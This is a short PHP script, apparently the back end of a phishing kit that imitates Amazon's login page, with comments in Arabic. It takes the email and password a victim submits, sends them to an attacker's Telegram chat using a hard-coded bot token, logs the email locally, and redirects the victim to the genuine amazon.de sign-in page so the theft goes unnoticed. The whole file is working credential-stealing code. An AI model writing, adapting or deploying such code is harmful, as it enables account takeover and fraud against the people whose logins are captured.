<?php
// telegram.php
$bot_token = '8832943565:AAGcI7DS4gWATLCUM78o3TSJVo5CBxCa-Wk';
$chat_id   = '-1003788054267';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if ($email && $password) {
        $message = "🔐 Amazon Login:\nEmail: $email\nPassword: $password";
        
        // استخدام cURL (أفضل وأسرع)
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$bot_token}/sendMessage");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
            'chat_id' => $chat_id,
            'text' => $message
        ]));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        // تسجيل للتصحيح (حط هاد السطر باش تشوف إذا وصل)
        file_put_contents('log.txt', date('Y-m-d H:i:s') . " - HTTP $http_code - $email\n", FILE_APPEND);
        
        // إعادة التوجيه لأمازون
        header('Location: https://www.amazon.de/ap/signin');
        exit;
    }
}
// إذا كانت البيانات ناقصة أو الوصول مباشر للملف، نوجه للصفحة الأصلية
header('Location: witing.html');
exit;
?>